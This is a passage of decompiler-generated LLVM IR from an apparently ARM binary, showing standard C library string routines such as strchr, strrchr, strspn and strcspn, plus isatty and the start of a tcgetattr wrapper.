  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 5, 2, 3, 4, 6 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_16fd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ef8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e98, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_16e24, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_16de8, { 1, 0 }
  uselistorder label %dec_label_pc_16dd4, { 1, 0 }
  uselistorder label %dec_label_pc_16d94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16c5c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_16c2c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_16bc8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16b88, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_16ff4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_16ff4 = phi i32 [ %v0_16ff4.pre, %bb ], [ %v5_16ff4, %bb3 ]
  %v0_16ff0 = phi i32 [ %tmp, %bb ], [ %v5_16ff0, %bb3 ]
  %v1_16ff0 = inttoptr i32 %v0_16ff0 to i8*
  %v2_16ff0 = load i8, i8* %v1_16ff0, align 1
  %v1_16ff4 = inttoptr i32 %v0_16ff4 to i8*
  %v2_16ff4 = load i8, i8* %v1_16ff4, align 1
  %v3_16ff4 = zext i8 %v2_16ff4 to i32
  %v2_16ff8 = icmp eq i8 %v2_16ff0, 0
  br i1 %v2_16ff8, label %.dec_label_pc_17004_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_16ff4 = add i32 %v0_16ff4, 1
  %v5_16ff0 = add i32 %v0_16ff0, 1
  %v3_16ff0 = zext i8 %v2_16ff0 to i32
  %v10_16ffc = icmp eq i8 %v2_16ff0, %v2_16ff4
  br i1 %v10_16ffc, label %entry, label %dec_label_pc_17004

.dec_label_pc_17004_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17004

dec_label_pc_17004:                               ; preds = %bb3, %.dec_label_pc_17004_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17004_crit_edge ], [ %v3_16ff0, %bb3 ]
  %v2_17004.pre-phi = sub nsw i32 %.pn, %v3_16ff4
  ret i32 %v2_17004.pre-phi

; uselistorder directives
  uselistorder i8 %v2_16ff0, { 0, 2, 1 }
  uselistorder i32 %v0_16ff0, { 1, 0 }
  uselistorder i32 %v0_16ff4, { 1, 0 }
  uselistorder label %dec_label_pc_17004, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17074 = urem i32 %arg1, 256
  %v0_170943 = load i32, i32* @r0, align 4
  %v1_170944 = urem i32 %v0_170943, 4
  %v2_170945 = icmp eq i32 %v1_170944, 0
  br i1 %v2_170945, label %dec_label_pc_1709c, label %dec_label_pc_1707c

dec_label_pc_1707c:                               ; preds = %entry, %dec_label_pc_17090
  %v0_17090 = phi i32 [ %v1_17090, %dec_label_pc_17090 ], [ %v0_170943, %entry ]
  %v1_1707c = inttoptr i32 %v0_17090 to i8*
  %v2_1707c = load i8, i8* %v1_1707c, align 1
  %v3_1707c = zext i8 %v2_1707c to i32
  %v9_17080 = icmp eq i32 %v3_1707c, %v1_17074
  br i1 %v9_17080, label %dec_label_pc_17150, label %dec_label_pc_17088

dec_label_pc_17088:                               ; preds = %dec_label_pc_1707c
  %v2_17088 = icmp eq i8 %v2_1707c, 0
  br i1 %v2_17088, label %dec_label_pc_1714c, label %dec_label_pc_17090

dec_label_pc_17090:                               ; preds = %dec_label_pc_17088
  %v1_17090 = add i32 %v0_17090, 1
  %v1_17094 = urem i32 %v1_17090, 4
  %v2_17094 = icmp eq i32 %v1_17094, 0
  br i1 %v2_17094, label %dec_label_pc_1709c, label %dec_label_pc_1707c

dec_label_pc_1709c:                               ; preds = %dec_label_pc_17090, %entry
  %v0_170a0 = phi i32 [ %v0_170943, %entry ], [ %v1_17090, %dec_label_pc_17090 ]
  %v4_1709c = mul nuw nsw i32 %v1_17074, 256
  %v5_1709c = or i32 %v4_1709c, %v1_17074
  %v4_170a4 = mul i32 %v5_1709c, 65536
  %v5_170a4 = or i32 %v4_170a4, %v5_1709c
  br label %dec_label_pc_170a8

dec_label_pc_170a8:                               ; preds = %dec_label_pc_17144, %dec_label_pc_170e4, %dec_label_pc_1709c
  %v0_1710c = phi i32 [ %v0_170a0, %dec_label_pc_1709c ], [ %v4_170a8, %dec_label_pc_170e4 ], [ %v4_170a8, %dec_label_pc_17144 ]
  %v1_170a8 = inttoptr i32 %v0_1710c to i32*
  %v2_170a8 = load i32, i32* %v1_170a8, align 4
  %v4_170a8 = add i32 %v0_1710c, 4
  %v2_170b0 = xor i32 %v2_170a8, %v5_170a4
  %v2_170bc = add i32 %v2_170a8, 2130640639
  %v1_170c0 = sub i32 -1, %v2_170a8
  %v2_170c4 = xor i32 %v2_170bc, %v1_170c0
  %v2_170d0 = and i32 %v2_170c4, -2130640640
  store i32 %v2_170d0, i32* @r1, align 4
  %v2_170d8 = icmp eq i32 %v2_170d0, 0
  br i1 %v2_170d8, label %dec_label_pc_170e4, label %dec_label_pc_170ec

dec_label_pc_170e4:                               ; preds = %dec_label_pc_170a8
  %v2_170b4 = add i32 %v2_170b0, 2130640639
  %v1_170cc = sub i32 -1, %v2_170b0
  %v2_170d4 = xor i32 %v2_170b4, %v1_170cc
  %v2_170dc = and i32 %v2_170d4, -2130640640
  %v2_170e4 = icmp eq i32 %v2_170dc, 0
  br i1 %v2_170e4, label %dec_label_pc_170a8, label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %dec_label_pc_170a8, %dec_label_pc_170e4
  %v2_170ec = inttoptr i32 %v0_1710c to i8*
  %v3_170ec = load i8, i8* %v2_170ec, align 1
  %v4_170ec = zext i8 %v3_170ec to i32
  %v9_170f0 = icmp eq i32 %v4_170ec, %v1_17074
  br i1 %v9_170f0, label %dec_label_pc_17150, label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170ec
  %v2_170fc = icmp eq i8 %v3_170ec, 0
  br i1 %v2_170fc, label %dec_label_pc_1714c, label %dec_label_pc_17104

dec_label_pc_17104:                               ; preds = %dec_label_pc_170fc
  %v1_17104 = add i32 %v0_1710c, 1
  %v2_17104 = inttoptr i32 %v1_17104 to i8*
  %v3_17104 = load i8, i8* %v2_17104, align 1
  %v4_17104 = zext i8 %v3_17104 to i32
  %v9_17108 = icmp eq i32 %v4_17104, %v1_17074
  br i1 %v9_17108, label %dec_label_pc_17150, label %dec_label_pc_17114

dec_label_pc_17114:                               ; preds = %dec_label_pc_17104
  %v2_17114 = icmp eq i8 %v3_17104, 0
  br i1 %v2_17114, label %dec_label_pc_1714c, label %dec_label_pc_1711c

dec_label_pc_1711c:                               ; preds = %dec_label_pc_17114
  %v1_1711c = add i32 %v0_1710c, 2
  %v2_1711c = inttoptr i32 %v1_1711c to i8*
  %v3_1711c = load i8, i8* %v2_1711c, align 1
  %v4_1711c = zext i8 %v3_1711c to i32
  %v9_17120 = icmp eq i32 %v4_1711c, %v1_17074
  br i1 %v9_17120, label %dec_label_pc_17150, label %dec_label_pc_1712c

dec_label_pc_1712c:                               ; preds = %dec_label_pc_1711c
  %v2_1712c = icmp eq i8 %v3_1711c, 0
  br i1 %v2_1712c, label %dec_label_pc_1714c, label %dec_label_pc_17134

dec_label_pc_17134:                               ; preds = %dec_label_pc_1712c
  %v1_17134 = add i32 %v0_1710c, 3
  %v2_17134 = inttoptr i32 %v1_17134 to i8*
  %v3_17134 = load i8, i8* %v2_17134, align 1
  %v4_17134 = zext i8 %v3_17134 to i32
  %v9_17138 = icmp eq i32 %v4_17134, %v1_17074
  br i1 %v9_17138, label %dec_label_pc_17150, label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %dec_label_pc_17134
  %v2_17144 = icmp eq i8 %v3_17134, 0
  br i1 %v2_17144, label %dec_label_pc_1714c, label %dec_label_pc_170a8

dec_label_pc_1714c:                               ; preds = %dec_label_pc_17088, %dec_label_pc_17144, %dec_label_pc_1712c, %dec_label_pc_17114, %dec_label_pc_170fc
  br label %dec_label_pc_17150

dec_label_pc_17150:                               ; preds = %dec_label_pc_1707c, %dec_label_pc_17134, %dec_label_pc_1711c, %dec_label_pc_17104, %dec_label_pc_170ec, %dec_label_pc_1714c
  %v1_17154 = phi i32 [ 0, %dec_label_pc_1714c ], [ %v1_17134, %dec_label_pc_17134 ], [ %v1_1711c, %dec_label_pc_1711c ], [ %v1_17104, %dec_label_pc_17104 ], [ %v0_1710c, %dec_label_pc_170ec ], [ %v0_17090, %dec_label_pc_1707c ]
  ret i32 %v1_17154

; uselistorder directives
  uselistorder i32 %v4_170a8, { 1, 0 }
  uselistorder i32 %v2_170a8, { 0, 2, 1 }
  uselistorder i32 %v0_1710c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1709c, { 1, 0 }
  uselistorder i32 %v1_17090, { 1, 0, 2 }
  uselistorder i32 %v0_170943, { 2, 1, 0 }
  uselistorder i32 %v1_17074, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17150, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1714c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_170ec, { 1, 0 }
  uselistorder label %dec_label_pc_1707c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17164 = urem i32 %arg1, 256
  %v0_171842 = load i32, i32* @r0, align 4
  %v1_171843 = urem i32 %v0_171842, 4
  %v2_171844 = icmp eq i32 %v1_171843, 0
  br i1 %v2_171844, label %dec_label_pc_1718c, label %dec_label_pc_1716c

dec_label_pc_1716c:                               ; preds = %entry, %dec_label_pc_17180
  %v0_17180 = phi i32 [ %v1_17180, %dec_label_pc_17180 ], [ %v0_171842, %entry ]
  %v1_1716c = inttoptr i32 %v0_17180 to i8*
  %v2_1716c = load i8, i8* %v1_1716c, align 1
  %v3_1716c = zext i8 %v2_1716c to i32
  %v9_17170 = icmp eq i32 %v3_1716c, %v1_17164
  br i1 %v9_17170, label %dec_label_pc_1723c, label %dec_label_pc_17178

dec_label_pc_17178:                               ; preds = %dec_label_pc_1716c
  %v2_17178 = icmp eq i8 %v2_1716c, 0
  br i1 %v2_17178, label %dec_label_pc_1723c, label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_17178
  %v1_17180 = add i32 %v0_17180, 1
  %v1_17184 = urem i32 %v1_17180, 4
  %v2_17184 = icmp eq i32 %v1_17184, 0
  br i1 %v2_17184, label %dec_label_pc_1718c, label %dec_label_pc_1716c

dec_label_pc_1718c:                               ; preds = %dec_label_pc_17180, %entry
  %v0_17190 = phi i32 [ %v0_171842, %entry ], [ %v1_17180, %dec_label_pc_17180 ]
  %v4_1718c = mul nuw nsw i32 %v1_17164, 256
  %v5_1718c = or i32 %v4_1718c, %v1_17164
  %v4_17194 = mul i32 %v5_1718c, 65536
  %v5_17194 = or i32 %v4_17194, %v5_1718c
  br label %dec_label_pc_17198

dec_label_pc_17198:                               ; preds = %dec_label_pc_17234, %dec_label_pc_171d4, %dec_label_pc_1718c
  %v0_171fc = phi i32 [ %v0_17190, %dec_label_pc_1718c ], [ %v4_17198, %dec_label_pc_171d4 ], [ %v4_17198, %dec_label_pc_17234 ]
  %v1_17198 = inttoptr i32 %v0_171fc to i32*
  %v2_17198 = load i32, i32* %v1_17198, align 4
  %v4_17198 = add i32 %v0_171fc, 4
  %v2_171a0 = xor i32 %v2_17198, %v5_17194
  %v2_171ac = add i32 %v2_17198, 2130640639
  %v1_171b0 = sub i32 -1, %v2_17198
  %v2_171b4 = xor i32 %v2_171ac, %v1_171b0
  %v2_171c0 = and i32 %v2_171b4, -2130640640
  store i32 %v2_171c0, i32* @r1, align 4
  %v2_171c8 = icmp eq i32 %v2_171c0, 0
  br i1 %v2_171c8, label %dec_label_pc_171d4, label %dec_label_pc_171dc

dec_label_pc_171d4:                               ; preds = %dec_label_pc_17198
  %v2_171a4 = add i32 %v2_171a0, 2130640639
  %v1_171bc = sub i32 -1, %v2_171a0
  %v2_171c4 = xor i32 %v2_171a4, %v1_171bc
  %v2_171cc = and i32 %v2_171c4, -2130640640
  %v2_171d4 = icmp eq i32 %v2_171cc, 0
  br i1 %v2_171d4, label %dec_label_pc_17198, label %dec_label_pc_171dc

dec_label_pc_171dc:                               ; preds = %dec_label_pc_17198, %dec_label_pc_171d4
  %v2_171dc = inttoptr i32 %v0_171fc to i8*
  %v3_171dc = load i8, i8* %v2_171dc, align 1
  %v4_171dc = zext i8 %v3_171dc to i32
  %v9_171e0 = icmp eq i32 %v4_171dc, %v1_17164
  br i1 %v9_171e0, label %dec_label_pc_1723c, label %dec_label_pc_171ec

dec_label_pc_171ec:                               ; preds = %dec_label_pc_171dc
  %v2_171ec = icmp eq i8 %v3_171dc, 0
  br i1 %v2_171ec, label %dec_label_pc_1723c, label %dec_label_pc_171f4

dec_label_pc_171f4:                               ; preds = %dec_label_pc_171ec
  %v1_171f4 = add i32 %v0_171fc, 1
  %v2_171f4 = inttoptr i32 %v1_171f4 to i8*
  %v3_171f4 = load i8, i8* %v2_171f4, align 1
  %v4_171f4 = zext i8 %v3_171f4 to i32
  %v9_171f8 = icmp eq i32 %v4_171f4, %v1_17164
  br i1 %v9_171f8, label %dec_label_pc_1723c, label %dec_label_pc_17204

dec_label_pc_17204:                               ; preds = %dec_label_pc_171f4
  %v2_17204 = icmp eq i8 %v3_171f4, 0
  br i1 %v2_17204, label %dec_label_pc_1723c, label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %dec_label_pc_17204
  %v1_1720c = add i32 %v0_171fc, 2
  %v2_1720c = inttoptr i32 %v1_1720c to i8*
  %v3_1720c = load i8, i8* %v2_1720c, align 1
  %v4_1720c = zext i8 %v3_1720c to i32
  %v9_17210 = icmp eq i32 %v4_1720c, %v1_17164
  br i1 %v9_17210, label %dec_label_pc_1723c, label %dec_label_pc_1721c

dec_label_pc_1721c:                               ; preds = %dec_label_pc_1720c
  %v2_1721c = icmp eq i8 %v3_1720c, 0
  br i1 %v2_1721c, label %dec_label_pc_1723c, label %dec_label_pc_17224

dec_label_pc_17224:                               ; preds = %dec_label_pc_1721c
  %v1_17224 = add i32 %v0_171fc, 3
  %v2_17224 = inttoptr i32 %v1_17224 to i8*
  %v3_17224 = load i8, i8* %v2_17224, align 1
  %v4_17224 = zext i8 %v3_17224 to i32
  %v9_17228 = icmp eq i32 %v4_17224, %v1_17164
  br i1 %v9_17228, label %dec_label_pc_1723c, label %dec_label_pc_17234

dec_label_pc_17234:                               ; preds = %dec_label_pc_17224
  %v2_17234 = icmp eq i8 %v3_17224, 0
  br i1 %v2_17234, label %dec_label_pc_1723c, label %dec_label_pc_17198

dec_label_pc_1723c:                               ; preds = %dec_label_pc_17178, %dec_label_pc_1716c, %dec_label_pc_17234, %dec_label_pc_17224, %dec_label_pc_1721c, %dec_label_pc_1720c, %dec_label_pc_17204, %dec_label_pc_171f4, %dec_label_pc_171ec, %dec_label_pc_171dc
  %v1_17240 = phi i32 [ %v1_17224, %dec_label_pc_17234 ], [ %v1_17224, %dec_label_pc_17224 ], [ %v1_1720c, %dec_label_pc_1721c ], [ %v1_1720c, %dec_label_pc_1720c ], [ %v1_171f4, %dec_label_pc_17204 ], [ %v1_171f4, %dec_label_pc_171f4 ], [ %v0_171fc, %dec_label_pc_171ec ], [ %v0_171fc, %dec_label_pc_171dc ], [ %v0_17180, %dec_label_pc_1716c ], [ %v0_17180, %dec_label_pc_17178 ]
  ret i32 %v1_17240

; uselistorder directives
  uselistorder i32 %v4_17198, { 1, 0 }
  uselistorder i32 %v2_17198, { 0, 2, 1 }
  uselistorder i32 %v0_171fc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1718c, { 1, 0 }
  uselistorder i32 %v1_17180, { 1, 0, 2 }
  uselistorder i32 %v0_171842, { 2, 1, 0 }
  uselistorder i32 %v1_17164, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1723c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_171dc, { 1, 0 }
  uselistorder label %dec_label_pc_1716c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1724c = load i32, i32* @r4, align 4
  store i32 %v3_1724c, i32* %stack_var_-16, align 4
  %v6_1724c = load i32, i32* @r5, align 4
  %v9_1724c = load i32, i32* @r6, align 4
  %v0_17250 = load i32, i32* @r0, align 4
  %v0_17254 = load i32, i32* @r1, align 4
  store i32 %v0_17254, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_172708 = inttoptr i32 %v0_17250 to i8*
  %v2_172709 = load i8, i8* %v1_172708, align 1
  %v3_1727010 = zext i8 %v2_172709 to i32
  store i32 %v3_1727010, i32* @r1, align 4
  %v2_1727411 = icmp eq i8 %v2_172709, 0
  store i32 %v0_17254, i32* @r0, align 4
  %v1_1727c12 = add i32 %v0_17250, 1
  store i32 %v1_1727c12, i32* @r4, align 4
  br i1 %v2_1727411, label %dec_label_pc_17284, label %dec_label_pc_17260

dec_label_pc_17260:                               ; preds = %entry, %dec_label_pc_1726c
  %v3_1727014 = phi i32 [ %v3_17270, %dec_label_pc_1726c ], [ %v3_1727010, %entry ]
  %v0_1727813 = phi i32 [ %v0_17278.pre, %dec_label_pc_1726c ], [ %v0_17254, %entry ]
  %v2_17260 = call i32 @__GI_strchr(i32 %v0_1727813, i32 %v3_1727014)
  %v2_17264 = icmp eq i32 %v2_17260, 0
  %v0_1726c = load i32, i32* @r5, align 4
  br i1 %v2_17264, label %dec_label_pc_1726c, label %dec_label_pc_17284

dec_label_pc_1726c:                               ; preds = %dec_label_pc_17260
  %v1_1726c = add i32 %v0_1726c, 1
  %v0_17270.pre = load i32, i32* @r4, align 4
  %v0_17278.pre = load i32, i32* @r6, align 4
  store i32 %v1_1726c, i32* @r5, align 4
  %v1_17270 = inttoptr i32 %v0_17270.pre to i8*
  %v2_17270 = load i8, i8* %v1_17270, align 1
  %v3_17270 = zext i8 %v2_17270 to i32
  store i32 %v3_17270, i32* @r1, align 4
  %v2_17274 = icmp eq i8 %v2_17270, 0
  store i32 %v0_17278.pre, i32* @r0, align 4
  %v1_1727c = add i32 %v0_17270.pre, 1
  store i32 %v1_1727c, i32* @r4, align 4
  br i1 %v2_17274, label %dec_label_pc_17284, label %dec_label_pc_17260

dec_label_pc_17284:                               ; preds = %dec_label_pc_1726c, %dec_label_pc_17260, %entry
  %v0_17284 = phi i32 [ 0, %entry ], [ %v0_1726c, %dec_label_pc_17260 ], [ %v1_1726c, %dec_label_pc_1726c ]
  %v2_17288 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17288, i32* @r4, align 4
  store i32 %v6_1724c, i32* @r5, align 4
  store i32 %v9_1724c, i32* @r6, align 4
  ret i32 %v0_17284

; uselistorder directives
  uselistorder i32 %v3_17270, { 1, 0 }
  uselistorder i32 %v0_17278.pre, { 1, 0 }
  uselistorder i32 %v0_17270.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17260, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17294 = urem i32 %arg2, 256
  store i32 %v1_17294, i32* @r4, align 4
  %v2_17294 = icmp eq i32 %v1_17294, 0
  br i1 %v2_17294, label %dec_label_pc_172a8, label %dec_label_pc_172bc.preheader

dec_label_pc_172bc.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_172c43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17294)
  %v2_172c85 = icmp eq i32 %v2_172c43, 0
  br i1 %v2_172c85, label %dec_label_pc_172d0, label %dec_label_pc_172b4

dec_label_pc_172a8:                               ; preds = %entry
  %v2_172ac = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_172d4

dec_label_pc_172b4:                               ; preds = %dec_label_pc_172bc.preheader, %dec_label_pc_172b4
  %v2_172c46 = phi i32 [ %v2_172c4, %dec_label_pc_172b4 ], [ %v2_172c43, %dec_label_pc_172bc.preheader ]
  store i32 %v2_172c46, i32* @r5, align 4
  %v1_172b8 = add i32 %v2_172c46, 1
  store i32 %v1_172b8, i32* @r0, align 4
  %v0_172c0 = load i32, i32* @r4, align 4
  %v2_172c4 = call i32 @__GI_strchr(i32 %v1_172b8, i32 %v0_172c0)
  %v2_172c8 = icmp eq i32 %v2_172c4, 0
  br i1 %v2_172c8, label %dec_label_pc_172d0, label %dec_label_pc_172b4

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172b4, %dec_label_pc_172bc.preheader
  %v0_172d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_172d4

dec_label_pc_172d4:                               ; preds = %dec_label_pc_172a8, %dec_label_pc_172d0
  %storemerge = phi i32 [ %v2_172ac, %dec_label_pc_172a8 ], [ %v0_172d0, %dec_label_pc_172d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_172c4, { 1, 0 }
  uselistorder i32 %v1_172b8, { 1, 0 }
  uselistorder i32 %v1_17294, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_172d4, { 1, 0 }
  uselistorder label %dec_label_pc_172b4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_173102 = load i32, i32* @r0, align 4
  %v1_173103 = inttoptr i32 %v0_173102 to i8*
  %v2_173104 = load i8, i8* %v1_173103, align 1
  %v2_173146 = icmp eq i8 %v2_173104, 0
  br i1 %v2_173146, label %dec_label_pc_17320, label %dec_label_pc_172f4.preheader

dec_label_pc_172ec:                               ; preds = %dec_label_pc_172f4
  %v1_172fc = add i32 %v0_172fc, 1
  %v9_172ec = icmp eq i8 %v0_172ec10.in, %v2_172f4
  br i1 %v9_172ec, label %dec_label_pc_17308, label %dec_label_pc_172f4

dec_label_pc_172f4:                               ; preds = %dec_label_pc_172f4.preheader, %dec_label_pc_172ec
  %v0_172fc = phi i32 [ %tmp, %dec_label_pc_172f4.preheader ], [ %v1_172fc, %dec_label_pc_172ec ]
  %v1_172f4 = inttoptr i32 %v0_172fc to i8*
  %v2_172f4 = load i8, i8* %v1_172f4, align 1
  %v2_172f8 = icmp eq i8 %v2_172f4, 0
  br i1 %v2_172f8, label %dec_label_pc_17320, label %dec_label_pc_172ec

dec_label_pc_17308:                               ; preds = %dec_label_pc_172ec
  %v1_17308 = add i32 %v0_17308, 1
  %v1_1730c = add i32 %v0_1730c, 1
  %v1_17310 = inttoptr i32 %v1_1730c to i8*
  %v2_17310 = load i8, i8* %v1_17310, align 1
  %v2_17314 = icmp eq i8 %v2_17310, 0
  br i1 %v2_17314, label %dec_label_pc_17320, label %dec_label_pc_172f4.preheader

dec_label_pc_172f4.preheader:                     ; preds = %entry, %dec_label_pc_17308
  %v0_1730c = phi i32 [ %v1_1730c, %dec_label_pc_17308 ], [ %v0_173102, %entry ]
  %v0_17308 = phi i32 [ %v1_17308, %dec_label_pc_17308 ], [ 0, %entry ]
  %v0_172ec10.in = phi i8 [ %v2_17310, %dec_label_pc_17308 ], [ %v2_173104, %entry ]
  br label %dec_label_pc_172f4

dec_label_pc_17320:                               ; preds = %dec_label_pc_17308, %dec_label_pc_172f4, %entry
  %v0_17320 = phi i32 [ 0, %entry ], [ %v0_17308, %dec_label_pc_172f4 ], [ %v1_17308, %dec_label_pc_17308 ]
  ret i32 %v0_17320

; uselistorder directives
  uselistorder i8 %v2_172f4, { 1, 0 }
  uselistorder i32 %v0_172fc, { 1, 0 }
  uselistorder label %dec_label_pc_172f4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17334 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17334, i32* @r1, align 4
  %v0_17338 = call i32 @__GI_tcgetattr()
  %v1_1733c = sub i32 1, %v0_17338
  %v2_1733c = icmp ult i32 %v0_17338, 2
  br i1 %v2_1733c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1734c = phi i32 [ %v1_1733c, %entry ], [ 0, %bb ]
  ret i32 %v1_1734c

; uselistorder directives
  uselistorder i32 %v0_17338, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17350 = load i32, i32* @r4, align 4
  %v6_17350 = load i32, i32* @r5, align 4
  %v9_17350 = load i32, i32* @r6, align 4
  %v2_17358 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1735c = load i32, i32* @r1, align 4
  store i32 %v0_1735c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17368 = load i32, i32* @r0, align 4
  %v3_17368 = call i32 @ioctl(i32 %v0_17368, i32 21505, i32 %v2_17358)
  store i32 %v3_17368, i32* %r0.global-to-local, align 4
  store i32 %v3_17368, i32* @r5, align 4
  %v2_1736c = icmp eq i32 %v3_17368, 0
  br i1 %v2_1736c, label %dec_label_pc_17374, label %dec_label_pc_173b8

dec_label_pc_17374:                               ; preds = %entry
  %v4_17380 = zext i8 %tmp to i32
  store i32 %v4_17380, i32* @ip, align 4
  %v3_17384 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17384, i32* @r3, align 4
  %v1_17388 = load i32, i32* @r4, align 4
  %v2_17388 = add i32 %v1_17388, 4
  %v3_17388 = inttoptr i32 %v2_17388 to i32*
  %v0_1738c = load i32, i32* %r1.global-to-local, align 4
  %v1_1738c = load i32, i32* @r4, align 4
  %v2_1738c = add i32 %v1_1738c, 8
  %v3_1738c = inttoptr i32 %v2_1738c to i32*
  store i32 %v0_1738c, i32* %v3_1738c, align 4
